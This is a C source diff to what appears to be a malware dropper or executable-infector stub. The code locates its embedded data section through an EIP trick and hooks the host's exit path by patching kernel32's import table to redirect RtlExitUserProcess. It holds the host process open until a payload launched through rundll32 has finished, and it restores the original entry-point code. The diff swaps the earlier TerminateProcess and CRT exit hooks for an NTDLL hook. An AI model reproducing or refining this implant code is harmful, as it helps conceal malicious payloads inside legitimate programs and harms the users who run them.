@@ -83,13 +83,18 @@ XREFNAMES data_imports[] = {
 			"GetVersionExA",		// 29
 			"IsWow64Process",		// 30
 			"GetCurrentProcess",	// 31
-			"TerminateProcess",     // 32
-			"GetModuleHandleA",		// 33
-			"GetCommandLineA",		// 34
-			"GetCommandLineW",		// 35
+			"GetModuleHandleA",		// 32
+			"GetCommandLineA",		// 33
+			"GetCommandLineW",		// 34
 			NULL
 	}
 	}, // KERNEL32.DLL
+	{ "NTDLL.DLL",
+	{
+			"RtlExitUserProcess",	// 35
+			NULL
+	}
+	}, // NTDLL.DLL
 	
 	{ "MSVCRT.DLL",
 	{
@@ -115,47 +120,38 @@ char * _needed_strings[] = {
 	"TMP",					// 2
 	"TEMP",					// 3
 	"KERNEL32.DLL",			// 4
-	"MSVCRT.DLL",			// 5
-	"LoadLibraryA",			// 6
-	"GetProcAddress",		// 7
-	"%systemroot%\\System32\\rundll32.exe \"", // 8
-	"\",HFF8",				// 9
-	"HFF5",					// 10
-	"\\",					// 11
-	"USER32.DLL",			// 12
-	"MSVCR60.dll",			// 13
-	"MSVCR70.dll",			// 14
-	"MSVCR80.dll",			// 15
-	"MSVCR90.dll",			// 16
-	"MSVCR100.dll",			// 17
-	"MSVCRXX!exit hooked",  // 18
-	"exit",					// 19
-	"_exit",				// 20
-	"ExitProcess",			// 21
-	"TerminateProcess",		// 22
-	"GetCommandLineA",		// 23
-	"GetCommandLineW",		// 24
+	"NTDLL.DLL",			// 5
+	"MSVCRT.DLL",			// 6
+	"LoadLibraryA",			// 7
+	"GetProcAddress",		// 8
+	"%systemroot%\\System32\\rundll32.exe \"", // 9
+	"\",HFF8",				// 10
+	"HFF5",					// 11
+	"\\",					// 12
+	"USER32.DLL",			// 13
+	"GetCommandLineA",		// 14
+	"GetCommandLineW",		// 15
+	"RtlExitUserProcess",	// 16
 
 #ifdef _DEBUG
-	"Error creating directory", // 25
-	"ExitProcess index %d", // 26
-	"ExitProcess hooked",   // 27
-	"Restoring OEP code",	// 28
-	"exit hooked",			// 29
-	"OEP restored!",		// 30
-	"Calling OEP @ %08x",	// 31
-	"Error creating file",  // 32
-	"Calling HFF5 ...",		// 33
-	"HFF5 called!",			// 34
-	"In ExitProcess Hook",  // 35
-	"Quitting vector NOW!", // 36
-	"VerifyVersionInfo @ %08x", // 37
-	"Sys MajorVersion %d",		// 38
-	"Sys MinorVersion %d",		// 39
-	"Restoring stage1 code",	// 40
-	"Restoring stage2 code",	// 41
-	"TerminateProcess hooked",	// 42
-	"Error uncompressing",		// 43
+	"Error creating directory", // 17
+	"ExitProcess index %d", // 18
+	"ExitProcess hooked",   // 19
+	"Restoring OEP code",	// 20
+	"exit hooked",			// 21
+	"OEP restored!",		// 22
+	"Calling OEP @ %08x",	// 23
+	"Error creating file",  // 24
+	"Calling HFF5 ...",		// 25
+	"HFF5 called!",			// 26
+	"In ExitProcess Hook",  // 27
+	"Quitting vector NOW!", // 28
+	"VerifyVersionInfo @ %08x", // 29
+	"Sys MajorVersion %d",		// 30
+	"Sys MinorVersion %d",		// 31
+	"Restoring stage1 code",	// 32
+	"Restoring stage2 code",	// 33
+	"Error uncompressing",		// 34
 #endif
 
 	NULL
@@ -345,7 +341,7 @@ NEXT_ENTRY:
 	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
 	ISWOW64PROCESS pfn_IsWow64Process = (ISWOW64PROCESS) dll_calls[CALL_ISWOW64PROCESS];
 	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
-
+	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];
 
 	DWORD imageBase = 0;
 	__asm {
@@ -377,6 +373,7 @@ NEXT_ENTRY:
 	CHECK_CALL( pfn_VirtualQuery );
 	CHECK_CALL( pfn_VirtualProtect );
 	CHECK_CALL( pfn_GetVersionEx );
+	CHECK_CALL( pfn_GetModuleHandle );
 	
 	//
 	// *** check for 64bit system
@@ -571,45 +568,31 @@ NEXT_ENTRY:
 	//
 	HOOKCALL pfn_HookCall = (HOOKCALL) (((char*)header) + header->functions.hookCall.offset);
 	EXITPROCESS pfn_ExitProcessHook = (EXITPROCESS)( ((char*)header) + header->functions.exitProcessHook.offset);
-	TERMINATEPROCESS pfn_TerminateProcessHook = (TERMINATEPROCESS)( ((char*)header) + header->functions.terminateProcessHook.offset);
-	EXIT pfn_ExitHook = (EXIT) ( ((char*)header) + header->functions.exitHook.offset);
-	ULONG oldProtect = 0xffffffff;
 	
-	// we can proceed even if hooking is not successful
-	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-	if(IAT_rva && pfn_HookCall)
+	IMAGE_DOS_HEADER * k32_dosHeader = (IMAGE_DOS_HEADER *) pfn_GetModuleHandle(STRING(STRIDX_KERNEL32_DLL));
+	IMAGE_NT_HEADERS * k32_ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)k32_dosHeader) + k32_dosHeader->e_lfanew);
+	UINT_PTR k32_IAT = k32_ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+	ULONG oldProtect = 0xffffffff;
+
+	if(pfn_HookCall && k32_IAT)
 	{
 		if(pfn_ExitProcessHook)
 		{
-			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), STRING(STRIDX_EXITPROCESS), (DWORD)pfn_ExitProcessHook, IAT_rva, imageBase, header);
-			// handle apps that enforce NX at runtime(e.g firefox, acrobat reader)
-			pfn_VirtualProtect(pfn_ExitProcessHook, (UINT_PTR)ExitProcessHook_End - (ULONG)ExitProcessHook, PAGE_EXECUTE_READWRITE, &oldProtect);
-		}
-		if(pfn_TerminateProcessHook)
-		{
-			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), STRING(STRIDX_TERMINATEPROCESS), (DWORD)pfn_TerminateProcessHook, IAT_rva, imageBase, header);
-			// handle apps that enforce NX at runtime(e.g firefox, acrobat reader)
-			pfn_VirtualProtect(pfn_TerminateProcessHook, (UINT_PTR)TerminateProcessHook_End - (ULONG)TerminateProcessHook, PAGE_EXECUTE_READWRITE, &oldProtect);
-		}
-		if(pfn_ExitHook)
-		{
-			pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), STRING(STRIDX_EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), STRING(STRIDX__EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR60_DLL), STRING(STRIDX_EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR60_DLL), STRING(STRIDX__EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR70_DLL), STRING(STRIDX_EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR70_DLL), STRING(STRIDX__EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR80_DLL), STRING(STRIDX_EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR80_DLL), STRING(STRIDX__EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR90_DLL), STRING(STRIDX_EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR90_DLL), STRING(STRIDX__EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR10_DLL), STRING(STRIDX_EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			pfn_HookCall(STRING(STRIDX_MSVCR10_DLL), STRING(STRIDX__EXITCALL), (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-			// handle apps that enforce NX at runtime(e.g firefox, acrobat reader)
-			pfn_VirtualProtect(pfn_ExitHook, (UINT_PTR)ExitHook_End - (UINT_PTR)ExitHook, PAGE_EXECUTE_READWRITE, &oldProtect);
+			pfn_HookCall(STRING(STRIDX_NTDLL_DLL), 
+				STRING(STRIDX_RTLEXITUSERPROCESS),
+				(DWORD)pfn_ExitProcessHook,
+				k32_IAT,
+				(DWORD)k32_dosHeader,
+				header);
+			
+			pfn_VirtualProtect(pfn_ExitProcessHook, 
+				(ULONG)ExitProcessHook_End - (ULONG)ExitProcessHook,
+				PAGE_EXECUTE_READWRITE,
+				&oldProtect);
 		}
 	}
 
+	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	if(header->exeType == EXE_TYPE_NSIS_INSTALLER)
 	{
 		GETCOMMANDLINEA pfn_GetCommandLineA = (GETCOMMANDLINEA) ( ((char*)header) + header->functions.GetCommandLineAHook.offset);
@@ -822,7 +805,7 @@ lbl_ref1:
 	// *** Find the ending marker of data section <E> 
 	while ( dwMagic != 0x003E453C )
 		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
-
+	
 	// *** Total size of data section
 	dwCurrentAddr -= sizeof(DWORD);
 	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
@@ -836,7 +819,7 @@ lbl_ref1:
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
 	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) dll_calls[CALL_EXITPROCESS];
+	EXITPROCESS pfn_OriginalRtlExitUserProcess = (EXITPROCESS) dll_calls[CALL_RTLEXITUSERPROCESS];
 	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
 	
 	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
@@ -846,103 +829,9 @@ lbl_ref1:
 	
 	MESSAGE(STRING(STRIDX_VECTORQUIT));
 	
-	pfn_OriginalExitProcess(uExitCode);
+	pfn_OriginalRtlExitUserProcess(uExitCode);
 }
 FUNCTION_END(ExitProcessHook);
-
-BOOL WINAPI TerminateProcessHook(__in HANDLE hProcess, __in  UINT uExitCode)
-{
-	DWORD dwCurrentAddr = 0;
-	DWORD dwMagic = 0;
-
-	// Get current EIP in dwCurrentAddr
-	__asm{
-		call lbl_ref1
-lbl_ref1:
-		pop dwCurrentAddr
-	}
-
-	// *** Find the ending marker of data section <E> 
-	while ( dwMagic != 0x003E453C )
-		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
-
-	// *** Total size of data section
-	dwCurrentAddr -= sizeof(DWORD);
-	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
-	
-	// *** Pointer to data section header
-	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);
-	
-	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
-	char * strings = (char *) (((char*)header) + header->strings.offset);
-	char * dlls = (char *) (((char*)header) + header->dlls.offset);
-	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
-	
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-	TERMINATEPROCESS pfn_OriginalTerminateProcess = (TERMINATEPROCESS) dll_calls[CALL_TERMINATEPROCESS];
-	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
-	
-	// if not killing self, pass through to original TerminateProcess
-	if (hProcess != pfn_GetCurrentProcess())
-		return pfn_OriginalTerminateProcess(hProcess, uExitCode);
-	
-	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
-	
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
-	while (header->synchro != 1)
-		pfn_Sleep(HOOKSLEEPTIME);
-	
-	MESSAGE(STRING(STRIDX_VECTORQUIT));
-	
-	return pfn_OriginalTerminateProcess(hProcess, uExitCode);
-}
-FUNCTION_END(TerminateProcessHook);
-
-__declspec(noreturn) void __cdecl ExitHook(int status)
-{
-	DWORD dwCurrentAddr = 0;
-	DWORD dwMagic = 0;
-	
-	// Get current EIP in dwCurrentAddr
-	__asm{
-		call lbl_ref1
-lbl_ref1:
-		pop dwCurrentAddr
-	}
-	
-	// *** Find the ending marker of data section <E> 
-	while ( dwMagic != 0x003E453C )
-		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
-
-	// *** Total size of data section
-	dwCurrentAddr -= sizeof(DWORD);
-	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
-	
-	// *** Pointer to data section header
-	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);
-	
-	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
-	char * strings = (char *) (((char*)header) + header->strings.offset);
-	char * dlls = (char *) (((char*)header) + header->dlls.offset);
-	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
-	
-#ifdef _DEBUG
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-#endif
-	
-	EXIT pfn_OriginalExit = (EXIT) dll_calls[CALL_EXIT];
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
-	
-	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
-	
-	while (header->synchro != 1)
-		pfn_Sleep(HOOKSLEEPTIME);
-	
-	MESSAGE(STRING(STRIDX_VECTORQUIT));
-		
-	pfn_OriginalExit(status);
-}
-FUNCTION_END(ExitHook);
 
 LPSTR WINAPI GetCommandLineAHook()
 {
